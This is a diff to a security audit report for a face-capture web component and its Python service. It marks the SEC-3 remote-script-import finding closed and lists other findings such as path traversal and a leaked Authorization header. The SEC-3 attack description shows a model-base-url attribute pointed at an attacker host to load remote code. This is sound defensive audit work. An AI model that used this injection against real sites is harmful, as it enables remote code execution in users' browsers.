@@ -18,7 +18,7 @@ The threat model evaluates a public web page embedding `<face-capture>` communic
 |---|---|---|---|---|
 | Medium | SEC-1 | Arbitrary File Write via Path Traversal in Asset Manifest | `src/face_inference/assets.py:125` | `tests/test_security_audit.py::test_sec_1_manifest_path_traversal` |
 | Medium | SEC-2 | Python Client Forwards Sensitive Authorization Header on HTTP Redirects | `src/face_inference/client.py:221-222` | `tests/test_security_audit.py::test_sec_2_client_redirect_strips_authorization` |
-| Medium | SEC-3 | Remote Script Execution via Unvalidated `model-base-url` Dynamic Import in Web Component | `packages/face-capture/src/face-capture.js:361-363`, `packages/face-capture/src/config.js:24-31` | `tests/test_security_audit.py::test_sec_3_model_base_url_untrusted_origin_rejected` |
+| Medium (closed) | SEC-3 | Remote Script Execution via Unvalidated `model-base-url` Dynamic Import in Web Component | `packages/face-capture/src/face-capture.js:361-363`, `packages/face-capture/src/config.js:24-31` | `tests/test_security_audit.py::test_sec_3_model_base_url_untrusted_origin_rejected` |
 | Medium | SEC-4 | Retention Purge Leaves Biometric Records in SQLite Free Pages and WAL Due to Missing `secure_delete` | `src/face_inference/storage.py:17`, `src/face_inference/service.py:57-64` | `tests/test_security_audit.py::test_sec_4_purge_sqlite_secure_delete_enabled` |
 | Medium | SEC-7 | Session Token Subject Constraint Ignored on Face Recognition Endpoint | `src/face_inference/server.py:249-251` | `tests/test_security_audit.py::test_sec_7_session_token_subject_binding_on_recognition` |
 | Low | SEC-6 | Worker Thread Denial of Service via Deeply Nested JSON Payloads | `src/face_inference/server.py:185`, `src/face_inference/server.py:189-191` | `tests/test_security_audit.py::test_sec_6_deeply_nested_json_dos` |
@@ -49,7 +49,8 @@ The threat model evaluates a public web page embedding `<face-capture>` communic
 - **Recommended Fix**: Pass the `Authorization` header via `unredirected_hdrs` in `urllib.request.Request(..., unredirected_hdrs={'Authorization': ...})`, or provide a custom `HTTPRedirectHandler` that strips `Authorization` headers whenever a redirect changes origin (scheme, host, or port).
 - **Proof Test**: `tests/test_security_audit.py::test_sec_2_client_redirect_strips_authorization`
 
-#### SEC-3: Remote Script Execution via Unvalidated `model-base-url` Dynamic Import in Web Component
+#### SEC-3 (closed): Remote Script Execution via Unvalidated `model-base-url` Dynamic Import in Web Component
+- **Status**: Closed. The component now always uses its shipped capture code; `model-base-url` only supplies model/WASM asset URLs (project decision: assets may come from a CDN, code may not). Regression test: `tests/test_security_audit.py::test_sec_3_component_never_imports_code_from_model_base_url` and `packages/face-capture/test/import-trust.test.mjs`.
 - **Location**: `packages/face-capture/src/face-capture.js:361-363`, `packages/face-capture/src/config.js:24-31`
 - **Severity Note**: Rated Medium because exploitation requires an attacker to control or influence DOM attributes on the hosting web page (`<face-capture model-base-url="...">`).
 - **Attack**: An attacker who can influence DOM attributes sets `<face-capture model-base-url="https://attacker.evil.com/models/">`. When `start()` executes, `_resolveCaptureClass` resolves `new URL('browser-face/capture.mjs', modelBaseUrl).href` and directly invokes dynamic `import(/* @vite-ignore */ url)`.
